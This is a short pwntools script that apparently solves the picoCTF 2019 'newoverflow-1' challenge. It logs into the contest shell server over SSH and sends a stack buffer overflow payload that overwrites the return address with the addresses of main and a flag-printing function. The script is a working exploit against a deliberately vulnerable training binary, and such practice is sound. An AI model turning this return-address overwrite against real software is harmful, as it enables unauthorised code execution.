from os import environ
from pwn import *

PATH='/problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7'
EXEC='vuln'

flag_call_adr = 0x00400767
main_call_adr = 0x004007e8

send = (0x40+8)*b'x' + p64(main_call_adr) + p64(flag_call_adr)

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])

sh = s.process(EXEC, cwd=PATH)

sh.sendlineafter('Welcome to 64-bit. Give me a string that gets you the flag: ', send)
sh.sendline(b' ')
x = sh.recvrepeat()

print(x.decode(errors='ignore'))

s.close()
